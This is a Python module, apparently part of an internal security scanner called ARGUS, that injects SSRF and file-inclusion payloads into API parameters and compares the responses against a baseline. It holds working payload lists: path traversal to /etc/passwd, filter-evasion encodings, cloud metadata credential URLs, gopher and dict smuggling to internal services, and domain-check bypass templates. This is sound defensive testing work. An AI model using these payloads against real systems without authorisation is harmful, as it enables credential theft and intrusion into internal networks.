"""
ARGUS - SSRF / File Inclusion 진단 모듈

search_engine.py가 식별한 의심 파라미터(SearchHit)에 실제 페이로드를 주입하여
"진짜로 취약점이 존재하는지"를 검증하는 모듈입니다.

  1) WAF/필터 우회를 위한 인코딩 변형 페이로드 자동 생성 (URL 인코딩, 더블 인코딩,
     슬래시/점 개별 인코딩, null byte, 대소문자 혼용)
  2) Baseline 응답과의 diff 비교로 오탐(False Positive) 감소
     (페이로드 없는 정상 요청 vs 페이로드 요청의 길이/상태코드 차이 분석)
  3) OOB(Out-of-Band) 콜백 검증 지원 - webhook.site / 자체 리스너 연동 인터페이스
  4) AWS/GCP/Azure/Alibaba/DigitalOcean 클라우드 메타데이터 다중 프로바이더 페이로드
  5) 8진수/10진수 IP 표기, Gopher/Dict 프로토콜 스미글링 등 추가 우회 페이로드
  6) 재시도 로직 강화 및 ZAP Active Scan 결과와 병합 가능한 동일 출력 스키마 유지
"""

import json
import re
import time
import random
import string
from itertools import product
from dataclasses import dataclass, field
from statistics import median
from typing import Any, Callable, List, Optional, Dict
from urllib.parse import quote, urlparse

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError

from models import ScanTarget, ScanParam, VulnType, RiskLevel, ParamLocation, DetectionSource
from search_engine import SearchHit, _is_constrained_param


# ==========================================================================
# 1. 페이로드 세트
# ==========================================================================

def _generate_encoding_variants(base_payload: str) -> List[str]:
    """
    하나의 base 페이로드로부터 WAF/필터 우회 가능성이 있는 인코딩 변형을 생성합니다.
    단순 문자열 매칭 기반 필터를 우회하기 위한 변형들입니다.
    """
    variants = [base_payload]

    # 1) 단순 URL 인코딩
    variants.append(quote(base_payload, safe=""))

    # 2) 더블 URL 인코딩 (예: ../ -> %2e%2e%2f -> %252e%252e%252f)
    variants.append(quote(quote(base_payload, safe=""), safe=""))

    # 3) 슬래시/점만 개별 인코딩 (필터가 '../' 문자열만 차단하는 경우 우회)
    variants.append(base_payload.replace("/", "%2f").replace(".", "%2e"))

    # 4) 대소문자 혼용 (스킴 검증이 case-sensitive한 경우 우회: FILE:// 등)
    if "://" in base_payload:
        scheme, rest = base_payload.split("://", 1)
        variants.append(f"{scheme.upper()}://{rest}")
        variants.append(f"{scheme.capitalize()}://{rest}")

    # 5) Null byte 추가 (구식 PHP 등에서 확장자 검증 우회)
    variants.append(base_payload + "%00")

    return list(dict.fromkeys(variants))  # 중복 제거, 순서 유지


# --- LFI: 경로 조작 ---
_LFI_BASE_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",          # 단순 블랙리스트 우회 (../ 제거 후 재조합)
    "..\\..\\..\\..\\windows\\win.ini",              # Windows 대상
    "/etc/passwd",                                    # 절대경로 직접 접근
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
]

LFI_PAYLOADS: List[str] = []
for _base in _LFI_BASE_PAYLOADS:
    LFI_PAYLOADS.extend(_generate_encoding_variants(_base))

# --- RFI ---
RFI_PAYLOADS = [
    "http://nonexistent-attacker-controlled-domain.invalid/exploit",
]

# --- SSRF: 클라우드 메타데이터 (다중 프로바이더) ---
CLOUD_METADATA_PAYLOADS = {
    "AWS":          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS_V1":       "http://169.254.169.254/latest/meta-data/",
    "GCP":          "http://metadata.google.internal/computeMetadata/v1/",
    "AZURE":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "ALIBABA":      "http://100.100.100.200/latest/meta-data/",
    "DIGITALOCEAN": "http://169.254.169.254/metadata/v1/",
}

# --- SSRF: 내부망/로컬 접근 ---
_SSRF_BASE_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",          # Redis 기본 포트
    "http://127.0.0.1:3306/",          # MySQL 기본 포트
    "http://localhost/admin",
    "http://0.0.0.0/",
    "http://[::1]/",                    # IPv6 로컬호스트
    "http://0177.0.0.1/",               # 8진수 표기 우회 (127.0.0.1)
    "http://2130706433/",               # 10진수 정수 표기 우회 (127.0.0.1)
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/",          # Memcached - 가이드라인 대응방안에서 위험 스킴으로 명시
    "gopher://127.0.0.1:6379/_INFO",    # Gopher 프로토콜 스미글링
]

SSRF_PAYLOADS = list(_SSRF_BASE_PAYLOADS) + list(CLOUD_METADATA_PAYLOADS.values())

# --- SSRF: 도메인 검증 우회 (가이드라인 예시 그대로 반영) ---
#   "http://skshieldus.com@http://192.168.x.x/security : 도메인 검증 우회"
#   "http://skshieldus.com/?url=https://bit.ly/kalskj3Ed : 단축 URL을 통한 우회"
SSRF_BYPASS_TEMPLATES = [
    "http://{whitelisted_domain}@127.0.0.1/",
    "http://{whitelisted_domain}%2540127.0.0.1/",     # @ 인코딩 우회 (%40 더블인코딩)
    "http://127.0.0.1#{whitelisted_domain}",           # fragment를 이용한 검증 우회
    "http://127.0.0.1?{whitelisted_domain}",           # query를 이용한 검증 우회
    "https://{whitelisted_domain}.127.0.0.1.nip.io/",   # DNS 와일드카드 서비스 악용
]

# 단축 URL 우회는 사전에 bit.ly 등에 내부 IP로 리다이렉트되는 단축 링크를 직접
# 등록해야 검증 가능합니다. 자동화하려면 OOB 콜백 서버와 결합해 런타임에
# 단축 URL을 발급받는 방식을 권장합니다 (OobCallbackProvider 참고).


# --------------------------------------------------------------------------
# 응답 누출 시그니처
# --------------------------------------------------------------------------
LEAK_SIGNATURES: Dict[str, List[str]] = {
    "etc_passwd": ["root:x:0:0:", "root:*:0:0:", "/bin/bash", "/bin/sh", "daemon:x:"],
    "windows_ini": ["[fonts]", "[extensions]", "for 16-bit app support"],
}

INTERNAL_RESPONSE_HINTS = [
    "ssh-2.0", "openssh", "redis_version", "memcached",
    "mysql_native_password", "<title>index of /</title>",
]

# 클라우드 메타데이터 응답에서 자격증명 노출을 암시하는 키워드
CLOUD_METADATA_LEAK_HINTS = [
    "accesskeyid", "secretaccesskey", "token", "instance-id",
    "computemetadata", "expires_on", "client_id",
]

INTERNAL_IP_PATTERN = re.compile(
    r"^https?://(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1\]|"
    r"169\.254\.169\.254|100\.100\.100\.200|metadata\.google\.internal|"
    r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|"
    r"172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|"
    r"192\.168\.\d{1,3}\.\d{1,3}|"
    r"0177\.0\.0\.1|2130706433)",
    re.IGNORECASE,
)

BINARY_CONTENT_TYPES = {
    "application/pdf",
    "application/octet-stream",
}
BINARY_BODY_SIGNATURES = (
    b"%PDF-",
    b"\x89PNG\r\n\x1a\n",
    b"PK\x03\x04",
    b"\xff\xd8\xff",  # JPEG
    b"GIF87a",
    b"GIF89a",
)


def _is_binary_response(resp: requests.Response) -> bool:
    content_type = resp.headers.get("Content-Type", "").split(";", 1)[0].strip().lower()
    return (
        content_type in BINARY_CONTENT_TYPES
        or content_type.startswith("image/")
        or any(resp.content.startswith(signature) for signature in BINARY_BODY_SIGNATURES)
    )


@dataclass
class InjectionResult:
    """페이로드 주입 1건의 검증 결과"""
    hit: SearchHit
    payload: str
    confirmed: bool
    evidence: str
    response_status: Optional[int] = None
    response_time_ms: Optional[float] = None
    detection_method: str = ""  # IN_BAND / TIMING / BASELINE_DIFF / OOB
    confidence: str = "LOW"  # HIGH / MEDIUM / LOW
    detection_source: DetectionSource = DetectionSource.CUSTOM_INJECTOR
    baseline_status: Optional[int] = None
    baseline_length: Optional[int] = None
    payload_response_length: Optional[int] = None
    response_body_snippet: Optional[str] = None
    request_body: Optional[dict] = None
    request_headers: Optional[dict] = None
    request_content_type: str = ""
    stored_ssrf_probe: Optional[dict] = None
    _response_body_preview: Optional[str] = field(default=None, repr=False)

    def to_dict(self) -> dict:
        return {
            "method": self.hit.target.method,
            "url": self.hit.target.full_url,
            "param": self.hit.param.name,
            "vuln_type": self.hit.vuln_type.value,
            "payload": self.payload,
            "confirmed": self.confirmed,
            "evidence": self.evidence,
            "status_code": self.response_status,
            "response_time_ms": self.response_time_ms,
            "detection_method": self.detection_method,
            "confidence": self.confidence,
            "detection_source": self.detection_source.value,
            "baseline_status": self.baseline_status,
            "baseline_length": self.baseline_length,
            "payload_response_length": self.payload_response_length,
            "response_body_snippet": self.response_body_snippet,
            "request_body": self.request_body,
            "request_headers": self.request_headers,
            "request_content_type": self.request_content_type,
            "stored_ssrf_probe": self.stored_ssrf_probe,
        }


@dataclass
class BaselineProbe:
    response: Optional[requests.Response]
    reason: str
    authorization_attached: bool
    attempts: List[dict]
    resolved_path_values: Dict[str, str]

    def to_dict(self) -> dict:
        return {
            "status_code": self.response.status_code if self.response is not None else None,
            "reason": self.reason,
            "authorization_attached": self.authorization_attached,
            "attempts": self.attempts,
            "resolved_path_values": self.resolved_path_values,
        }


class OobCallbackProvider:
    """
    Out-of-Band 콜백 검증을 위한 인터페이스.
    webhook.site, interactsh, 또는 자체 호스팅 리스너 API와 연동할 수 있도록
    추상화했습니다. 기본 구현은 비활성(no-op)이며, 실제 사용 시
    register_unique_callback / check_callback_received를 구현체로 교체하세요.
    """

    def __init__(self, enabled: bool = False, base_callback_domain: str = ""):
        self.enabled = enabled
        self.base_callback_domain = base_callback_domain  # 예: "xxxx.oast.fun"

    def register_unique_callback(self, hit_id: str) -> Optional[str]:
        """
        이 요청 전용 고유 콜백 URL을 발급합니다.
        예: https://<random>.oast.fun  형태.
        실제 서비스 연동 시 이 메서드에서 API를 호출해 고유 서브도메인을 받아오세요.
        """
        if not self.enabled or not self.base_callback_domain:
            return None
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"http://{token}.{self.base_callback_domain}/"

    def check_callback_received(self, callback_url: str, wait_seconds: int = 3) -> bool:
        """
        발급한 콜백 URL로 실제 요청이 들어왔는지 확인합니다.
        실제 연동 시 콜백 서비스의 polling API를 호출하도록 구현하세요.
        기본 구현은 항상 False (미확인)을 반환합니다.
        """
        if not self.enabled:
            return False
        time.sleep(wait_seconds)
        # TODO: 실제 OOB 서비스 polling API 연동
        return False


class PayloadInjector:
    """
    SearchHit 목록을 받아 실제 HTTP 요청으로 페이로드를 주입하고,
    응답을 분석해 취약점 존재 여부를 판정합니다.

    고도화 포인트:
      - baseline 요청(안전한 더미 값)과 페이로드 요청을 비교해 오탐을 줄임
      - 인코딩 변형 페이로드까지 자동으로 시도
      - OOB 콜백 검증 지원 (옵션)
    """

    def __init__(self, timeout: int = 6, delay_between_requests: float = 0.3,
                 whitelisted_domain_for_bypass: str = "example.com",
                 max_payloads_per_param: int = 8,
                  oob_provider: Optional[OobCallbackProvider] = None,
                  retry_count: int = 1,
                  auth_headers: Optional[Dict[str, str]] = None,
                   resource_ids: Optional[Dict[str, List[str]]] = None,
                   auth_refresh_callback: Optional[Callable[[], Optional[Dict[str, str]]]] = None,
                   scan_targets: Optional[List[ScanTarget]] = None):
        self.timeout = timeout
        self.delay = delay_between_requests
        self.whitelisted_domain = whitelisted_domain_for_bypass
        self.max_payloads_per_param = max_payloads_per_param
        self.oob_provider = oob_provider or OobCallbackProvider(enabled=False)
        self.retry_count = retry_count
        self.resource_ids = resource_ids or {}
        self.auth_refresh_callback = auth_refresh_callback
        self.scan_targets = scan_targets or []

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "ARGUS-SSRF-Scanner/2.0 (+internal security assessment)"
        })
        if auth_headers:
            self.session.headers.update(auth_headers)

        # 동일 target.full_url에 대한 baseline 응답 캐시 (중복 요청 방지)
        self._baseline_cache: Dict[str, requests.Response] = {}
        self._baseline_probes: Dict[str, BaselineProbe] = {}
        self._resolved_path_values: Dict[str, Dict[str, str]] = {}
        self.skipped_unauthorized_hits: List[SearchHit] = []
        self.skipped_unauthorized_details: List[dict] = []
        self.skipped_failed_baseline_hits: List[SearchHit] = []
        self.skipped_failed_baseline_details: List[dict] = []

    # ----------------------------------------------------------------
    def inject_all(
        self,
        hits: List[SearchHit],
        on_progress: Optional[Callable[..., None]] = None,
    ) -> List[InjectionResult]:
        results: List[InjectionResult] = []

        total = len(hits)
        for index, hit in enumerate(hits, start=1):
            if on_progress:
                on_progress(
                    done=index - 1,
                    total=total,
                    item=f"{hit.target.method} {hit.target.full_url} · {hit.param.name}",
                )
            baseline = self._get_baseline(hit)
            if baseline is not None and baseline.status_code in (401, 403):
                self.skipped_unauthorized_hits.append(hit)
                probe = self._baseline_probes.get(self._target_cache_key(hit.target))
                self.skipped_unauthorized_details.append({
                    **hit.to_dict(),
                    "access_probe": probe.to_dict() if probe else {},
                })
                continue
            if baseline is not None and baseline.status_code in (400, 409, 422, 500):
                baseline_polluted = baseline.status_code in (409, 422)
                if baseline_polluted:
                    reason = (
                        f"baseline 요청 자체가 {baseline.status_code}로 응답함 - 이전 스캔에서 "
                        "생성된 잔여 테스트 데이터로 인해 오탐/미탐 판정이 부정확할 수 있음. "
                        "테스트 계정/리소스를 정리한 후 재스캔 권장"
                    )
                else:
                    reason = (
                        f"baseline 응답이 {baseline.status_code}이므로 필수 필드 누락 또는 "
                        "서버 오류로 판단하여 페이로드 주입을 스킵"
                    )
                self.skipped_failed_baseline_hits.append(hit)
                self.skipped_failed_baseline_details.append({
                    **hit.to_dict(),
                    "baseline_status": baseline.status_code,
                    "baseline_polluted": baseline_polluted,
                    "content_type": hit.target.content_type,
                    "baseline_response_body_snippet": (baseline.text or "")[:1000] or None,
                    "skip_reason": reason,
                })
                log_prefix = "[경고]" if baseline_polluted else "[주입 스킵]"
                print(
                    f"{log_prefix} {hit.target.method} {hit.target.full_url} "
                    f"(param={hit.param.name}) -> {reason}"
                )
                continue

            hit_result_start = len(results)
            payloads = self._select_payloads(hit.vuln_type)[: self.max_payloads_per_param]

            for payload in payloads:
                result = self._inject_single(hit, payload, baseline=baseline)
                if result:
                    self._verify_stored_ssrf(result, payload)
                    results.append(result)
                time.sleep(self.delay)

            # 도메인 검증 우회 패턴 (SSRF 타입에 한해 추가 시도)
            if hit.vuln_type == VulnType.SSRF:
                for template in SSRF_BYPASS_TEMPLATES:
                    bypass_payload = template.format(whitelisted_domain=self.whitelisted_domain)
                    result = self._inject_single(hit, bypass_payload, baseline=baseline,
                                                  label="DOMAIN_BYPASS")
                    if result:
                        self._verify_stored_ssrf(result, bypass_payload)
                        results.append(result)
                    time.sleep(self.delay)

                # OOB 콜백 검증 (활성화된 경우)
                oob_result = self._try_oob_verification(hit)
                if oob_result:
                    results.append(oob_result)

            self._apply_response_size_anomalies(
                results[hit_result_start:], baseline
            )
            self._apply_uniform_response_check(results[hit_result_start:], baseline)

        if on_progress:
            on_progress(done=total, total=total, item="payload injection complete")
        return results

    # ----------------------------------------------------------------
    def _select_payloads(self, vuln_type: VulnType) -> List[str]:
        if vuln_type == VulnType.LFI:
            return LFI_PAYLOADS
        if vuln_type == VulnType.RFI:
            return LFI_PAYLOADS + RFI_PAYLOADS
        if vuln_type == VulnType.SSRF:
            return SSRF_PAYLOADS
        return []

    # ----------------------------------------------------------------
    def _sample_for_param(self, param: ScanParam) -> Any:
        schema = param.schema or {}
        resource_candidates = self._resource_candidates(param.name)
        if resource_candidates and (
            param.name.lower().endswith("id") or param.name.lower() == "id"
        ):
            value = resource_candidates[0]
        elif schema.get("type") in {"object", "array"}:
            return self._sample_from_schema(param.name, schema)
        elif param.sample_value is not None:
            value = param.sample_value
        elif schema.get("enum"):
            value = schema["enum"][0]
        else:
            name = param.name.lower()
            schema_type = schema.get("type", "string")
            fmt = schema.get("format", "")

            if schema_type in ("integer", "number") or fmt in ("int32", "int64", "double", "float"):
                value = "0" if name == "page" else "1"
            elif schema_type == "boolean":
                value = "false"
            elif fmt == "date-time":
                value = "2026-06-30T00:00:00"
            elif fmt == "date":
                value = "2026-06-30"
            elif "email" in name:
                value = "argus@example.com"
            elif "phone" in name:
                value = "010-1234-5678"
            else:
                value = "argus-test"

        return self._coerce_value(value, schema)

    def _sample_from_schema(self, name: str, schema: dict) -> Any:
        schema_type = schema.get("type")
        if schema_type == "object":
            return {
                child_name: self._sample_from_schema(child_name, child_schema)
                for child_name, child_schema in schema.get("properties", {}).items()
            }
        if schema_type == "array":
            return [self._sample_from_schema(name, schema.get("items", {}))]

        normalized_name = re.sub(r"[^a-z0-9]", "", name.lower())
        if normalized_name.endswith("url") or normalized_name in {"uri", "link", "src"}:
            return "https://example.com/argus-baseline.png"
        if schema.get("enum"):
            return schema["enum"][0]
        return self._coerce_value("argus-test", schema)

    # ----------------------------------------------------------------
    @staticmethod
    def _target_cache_key(target: ScanTarget) -> str:
        return f"{target.method}:{target.full_url}:{target.content_type.lower()}"

    # ----------------------------------------------------------------
    @staticmethod
    def _apply_response_size_anomalies(
        hit_results: List[InjectionResult], baseline: Optional[requests.Response]
    ) -> None:
        """Confirm port-specific internal URL size outliers across one hit's attempts."""
        if baseline is None or len(hit_results) < 5:
            return

        def raw_payload(result: InjectionResult) -> str:
            if result.payload.startswith(("DOMAIN_BYPASS:", "OOB_PROBE:")):
                return result.payload.split(":", 1)[1]
            return result.payload

        comparable = [
            result for result in hit_results
            if result.payload_response_length is not None
            and result.response_status is not None
            and not result.payload.startswith("DOMAIN_BYPASS:")
            and INTERNAL_IP_PATTERN.match(raw_payload(result))
        ]
        if len(comparable) < 5:
            return

        peer_median = median(
            result.payload_response_length for result in comparable
        )
        deviations = [
            abs(result.payload_response_length - peer_median)
            for result in comparable
        ]
        median_deviation = median(deviations)
        anomaly_threshold = max(200, 3 * median_deviation)
        baseline_length = len(baseline.text or "")

        for result in comparable:
            if result.confirmed or result.hit.vuln_type != VulnType.SSRF:
                continue
            payload = raw_payload(result)
            if not INTERNAL_IP_PATTERN.match(payload):
                continue
            try:
                port = urlparse(payload).port
            except ValueError:
                port = None
            increase_from_baseline = result.payload_response_length - baseline_length
            increase_from_peers = result.payload_response_length - peer_median
            if (
                port is not None
                and increase_from_baseline >= 200
                and increase_from_peers >= anomaly_threshold
            ):
                result.confirmed = True
                result.detection_method = "ANOMALY_RESPONSE_SIZE"
                result.confidence = "HIGH"
                result.response_body_snippet = result._response_body_preview
                result.evidence = (
                    f"내부 주소의 특정 포트({port}) 응답 크기가 동일 파라미터의 다른 "
                    f"페이로드보다 비정상적으로 증가 "
                    f"(baseline {baseline_length}자, 응답 {result.payload_response_length}자, "
                    f"동료 중앙값 {peer_median:.0f}자, +{increase_from_peers:.0f}자)"
                )

    @staticmethod
    def _apply_uniform_response_check(
        hit_results: List[InjectionResult], baseline: Optional[requests.Response]
    ) -> None:
        """Downgrade baseline-only SSRF evidence when payload responses are uniform."""
        if baseline is None:
            return

        comparable = [
            result for result in hit_results
            if result.detection_method == "BASELINE_DIFF"
            and result.response_status is not None
            and result.payload_response_length is not None
        ]
        if len(comparable) < 3:
            return

        # JSON error bodies often vary by one or two characters (for example an ID),
        # while still representing the same business-logic response.
        groups: List[List[InjectionResult]] = []
        for result in comparable:
            group = next((
                candidates for candidates in groups
                if candidates[0].response_status == result.response_status
                and abs(candidates[0].payload_response_length - result.payload_response_length) <= 2
            ), None)
            if group is None:
                groups.append([result])
            else:
                group.append(result)

        uniform = max(groups, key=len)
        if len(uniform) < 3 or len(uniform) / len(comparable) < 0.70:
            return

        status = uniform[0].response_status
        lengths = sorted({result.payload_response_length for result in uniform})
        for result in uniform:
            result.confirmed = False
            result.confidence = "LOW"
            result.evidence = (
                f"서로 다른 내부 대상 페이로드 {len(uniform)}개가 균일한 응답을 반환 "
                f"(status={status}, length={lengths}) - 비멱등/중복 비즈니스 응답 가능성이 "
                "높아 BASELINE_DIFF 확정에서 제외"
            )

        if baseline.status_code in (200, 201) and status in (409, 422):
            print(
                "[경고] 이 엔드포인트는 재요청 시 상태가 달라지는 비멱등 "
                "엔드포인트로 보임 - BASELINE_DIFF 신뢰도 낮음"
            )

    def _verify_stored_ssrf(self, result: InjectionResult, payload: str) -> None:
        """Read back a successfully stored URL without platform-specific names."""
        if result.hit.target.method.upper() not in {"POST", "PUT", "PATCH"}:
            return
        if result.response_status not in {200, 201, 202, 204}:
            return
        if not INTERNAL_IP_PATTERN.match(payload):
            return
        if result.hit.vuln_type not in {VulnType.SSRF, VulnType.RFI}:
            return

        read_target = self._find_stored_read_target(result.hit.target)
        if read_target is None:
            return

        try:
            # Build the request from the Swagger GET operation.  Calling
            # write_target.full_url with GET produced method-not-supported
            # noise and detail paths may still contain unresolved {id}s.
            read_probe = self.probe_target_access(read_target, force=True)
            response = read_probe.response
        except RequestException:
            return

        if response is None:
            return

        attempted_url = (
            read_probe.attempts[-1].get("url")
            if read_probe.attempts else read_target.full_url
        )

        body = response.text or ""
        payload_found = payload in body
        if response.status_code < 400 and payload_found:
            result.confirmed = True
            result.detection_method = "IN_BAND_STORED_SSRF"
            result.confidence = "HIGH"
            result.evidence = (
                f"저장된 SSRF 페이로드 확인: 쓰기 성공 후 별도 GET 응답에서 "
                f"'{payload}'가 그대로 반환됨 (Stored/2차 SSRF)"
            )

        result.stored_ssrf_probe = {
            "get_url": attempted_url,
            "get_status": response.status_code,
            "payload_found_in_body": payload_found,
            "body_snippet": self._sanitize_snippet(body),
        }

    def _find_stored_read_target(self, write_target: ScanTarget) -> Optional[ScanTarget]:
        """Select a Swagger-declared GET endpoint for the written resource."""
        write_parts = [part for part in write_target.path.strip("/").split("/") if part]
        generic_parts = {"api", "v1", "v2", "v3", "admin", "seller", "user", "users"}
        write_resource_parts = {
            part.casefold() for part in write_parts
            if not part.startswith("{") and part.casefold() not in generic_parts
        }
        candidates = []
        for target in self.scan_targets:
            if target.method.upper() != "GET":
                continue
            read_parts = [part for part in target.path.strip("/").split("/") if part]
            read_resource_parts = {
                part.casefold() for part in read_parts
                if not part.startswith("{") and part.casefold() not in generic_parts
            }
            # A shared /api/v1 prefix does not make this the same resource.
            # Without a meaningful resource segment, skip the probe entirely.
            if not write_resource_parts.intersection(read_resource_parts):
                continue
            common = 0
            for left, right in zip(write_parts, read_parts):
                if left == right or left.startswith("{") or right.startswith("{"):
                    common += 1
                else:
                    break
            if common < 2:
                continue
            # Prefer collection/list GETs because they need no guessed resource
            # identifier.  A detail GET remains a fallback when Swagger exposes
            # no collection reader; probe_target_access resolves its path IDs.
            path_param_count = sum(part.startswith("{") for part in read_parts)
            length_penalty = abs(len(read_parts) - len(write_parts))
            candidates.append((-path_param_count, common, -length_penalty, target))
        if not candidates:
            return None
        return max(candidates, key=lambda item: item[:-1])[-1]

    @staticmethod
    def _sanitize_snippet(body: str, max_len: int = 200) -> str:
        """Mask common secret values before retaining a short response preview."""
        sensitive = "password|token|secret|key|credential|auth"
        sanitized = re.sub(
            rf'("[^"]*(?:{sensitive})[^"]*"\s*:\s*)"[^"]*"',
            r'\1"<masked>"',
            body,
            flags=re.IGNORECASE,
        )
        return sanitized[:max_len]

    # ----------------------------------------------------------------
    def _authorization_attached(self) -> bool:
        return any(
            name.lower() == "authorization" and bool(str(value).strip())
            for name, value in self.session.headers.items()
        )

    # ----------------------------------------------------------------
    def _resource_candidates(self, param_name: str) -> List[str]:
        exact_values: List[str] = []
        fallback_values: List[str] = []
        wanted = param_name.casefold()
        for key, candidates in self.resource_ids.items():
            raw_values = candidates if isinstance(candidates, list) else [candidates]
            for value in raw_values:
                text = str(value)
                if not text:
                    continue
                destination = exact_values if key.casefold() == wanted else fallback_values
                if text not in destination:
                    destination.append(text)
        return exact_values + [v for v in fallback_values if v not in exact_values]

    # ----------------------------------------------------------------
    def _path_value_options(self, target: ScanTarget) -> List[Dict[str, str]]:
        path_params = [p for p in target.params if p.location == ParamLocation.PATH]
        if not path_params:
            return []

        names = [p.name for p in path_params]
        options = []
        has_resource_candidate = False
        for param in path_params:
            candidates = self._resource_candidates(param.name)
            if candidates:
                has_resource_candidate = True
            else:
                candidates = [str(self._sample_for_param(param))]
            options.append(candidates[:5])

        if not has_resource_candidate:
            return []

        combinations = []
        for values in product(*options):
            mapping = dict(zip(names, values))
            if mapping not in combinations:
                combinations.append(mapping)
            if len(combinations) >= 12:
                break
        return combinations

    # ----------------------------------------------------------------
    def _build_safe_request(self, target: ScanTarget,
                            path_values: Optional[Dict[str, str]] = None):
        path_values = path_values or {}
        url = target.full_url
        kwargs = {"timeout": self.timeout, "allow_redirects": False}
        query_params = {}
        body_params = {}
        header_params = {}

        for param in target.params:
            value = self._sample_for_param(param)
            if param.location == ParamLocation.PATH:
                url = url.replace(f"{{{param.name}}}", str(path_values.get(param.name, value)))
            elif param.location == ParamLocation.QUERY:
                query_params[param.name] = value
            elif param.location == ParamLocation.BODY:
                body_params[param.name] = value
            elif param.location == ParamLocation.HEADER:
                if param.name.casefold() == "authorization" and self._authorization_attached():
                    header_params[param.name] = self.session.headers["Authorization"]
                else:
                    header_params[param.name] = str(value)

        if query_params:
            kwargs["params"] = query_params
        if body_params and target.method.upper() not in ("GET", "DELETE"):
            if target.content_type.lower().startswith("multipart/form-data"):
                kwargs["files"] = self._multipart_fields(body_params)
            else:
                kwargs["json"] = body_params
        if header_params:
            kwargs["headers"] = header_params
        return url, kwargs

    # ----------------------------------------------------------------
    def probe_target_access(self, target: ScanTarget, force: bool = False) -> BaselineProbe:
        """Probe auth, then retry denied path targets with caller/JWT resource IDs."""
        cache_key = self._target_cache_key(target)
        if not force and cache_key in self._baseline_probes:
            return self._baseline_probes[cache_key]

        auth_attached = self._authorization_attached()
        attempts: List[dict] = []
        response = None
        resolved: Dict[str, str] = {}

        path_options = [{}]
        if auth_attached:
            for option in self._path_value_options(target):
                if option not in path_options:
                    path_options.append(option)

        for index, path_values in enumerate(path_options):
            try:
                url, kwargs = self._build_safe_request(target, path_values)
                response = self.session.request(target.method, url, **kwargs)
                if response.status_code == 401 and self.auth_refresh_callback:
                    refreshed_headers = self.auth_refresh_callback()
                    if refreshed_headers:
                        self.session.headers.update(refreshed_headers)
                        response = self.session.request(target.method, url, **kwargs)
                        print("[인증 갱신] baseline 401 응답 후 재로그인하여 1회 재시도")
                attempts.append({"url": url, "status_code": response.status_code,
                                 "path_values": path_values})
                resolved = path_values
                if response.status_code not in (401, 403):
                    break
                if index == 0 and len(path_options) == 1:
                    break
            except RequestException as exc:
                attempts.append({"url": target.full_url, "status_code": None,
                                 "path_values": path_values,
                                 "error": type(exc).__name__})
                response = None
                break

        if response is None:
            reason = "ACCESS_PROBE_INCONCLUSIVE"
        elif response.status_code in (401, 403) and not auth_attached:
            reason = "AUTHORIZATION_HEADER_MISSING"
        elif response.status_code in (401, 403):
            reason = (
                "AUTHORIZATION_DENIED_AFTER_RESOURCE_ID_FALLBACK"
                if len(attempts) > 1 else "AUTHORIZATION_DENIED"
            )
        elif len(attempts) > 1:
            reason = "ACCESSIBLE_WITH_RESOURCE_ID_FALLBACK"
        else:
            reason = "ACCESSIBLE"

        probe = BaselineProbe(response, reason, auth_attached, attempts, resolved)
        self._baseline_probes[cache_key] = probe
        if response is not None:
            self._baseline_cache[cache_key] = response
        if resolved:
            self._resolved_path_values[cache_key] = resolved
        return probe

    # ----------------------------------------------------------------
    def _payload_for_param(self, param: ScanParam, payload: str) -> Any:
        schema = param.schema or {}
        if schema.get("type") == "array":
            return [payload]
        return self._coerce_value(payload, schema, keep_payload_string=True)

    # ----------------------------------------------------------------
    def _coerce_value(self, value: Any, schema: dict, keep_payload_string: bool = False) -> Any:
        schema_type = schema.get("type")
        fmt = schema.get("format", "")
        if keep_payload_string:
            return value
        if schema_type == "integer" or fmt in ("int32", "int64"):
            try:
                return int(value)
            except (TypeError, ValueError):
                return 1
        if schema_type == "number" or fmt in ("double", "float"):
            try:
                return float(value)
            except (TypeError, ValueError):
                return 1.0
        if schema_type == "boolean":
            return str(value).lower() == "true"
        if schema_type == "array":
            return value if isinstance(value, list) else [value]
        return value

    # ----------------------------------------------------------------
    def _build_url(self, hit: SearchHit, payload: str) -> str:
        url = hit.target.full_url
        resolved = self._resolved_path_values.get(self._target_cache_key(hit.target), {})
        for p in hit.target.params:
            if p.location != ParamLocation.PATH:
                continue
            value = payload if p.name == hit.param.name else resolved.get(
                p.name, str(self._sample_for_param(p))
            )
            url = url.replace(f"{{{p.name}}}", value)
        return url

    # ----------------------------------------------------------------
    def _build_request_kwargs(self, hit: SearchHit, payload: str) -> dict:
        target = hit.target
        param = hit.param

        kwargs = {"timeout": self.timeout, "allow_redirects": False}

        query_params = {}
        body_params = {}
        header_params = {}

        for p in target.params:
            if p.location == ParamLocation.QUERY:
                query_params[p.name] = (
                    payload if p.name == param.name else self._sample_for_param(p)
                )
            elif p.location == ParamLocation.BODY:
                body_params[p.name] = (
                    self._payload_for_param(p, payload)
                    if p.name == param.name else self._sample_for_param(p)
                )
            elif p.location == ParamLocation.HEADER:
                if p.name.casefold() == "authorization" and self._authorization_attached():
                    header_params[p.name] = self.session.headers["Authorization"]
                else:
                    header_params[p.name] = (
                        payload if p.name == param.name else str(self._sample_for_param(p))
                    )

        if query_params:
            kwargs["params"] = query_params
        if body_params and target.method.upper() not in ("GET", "DELETE"):
            if target.content_type.lower().startswith("multipart/form-data"):
                kwargs["files"] = self._multipart_fields(body_params)
            else:
                kwargs["json"] = body_params
        if param.location == ParamLocation.HEADER:
            kwargs["headers"] = header_params or {param.name: payload}

        return kwargs

    @staticmethod
    def _multipart_fields(body_params: Dict[str, Any]) -> Dict[str, tuple]:
        fields = {}
        for name, value in body_params.items():
            if isinstance(value, (dict, list)):
                value = json.dumps(value, ensure_ascii=False)
            elif isinstance(value, bool):
                value = str(value).lower()
            else:
                value = str(value)
            fields[name] = (None, value, "text/plain")
        return fields

    # ----------------------------------------------------------------
    def _get_baseline(self, hit: SearchHit) -> Optional[requests.Response]:
        """
        페이로드 없이(안전한 더미 값으로) 보낸 baseline 응답을 캐싱하여
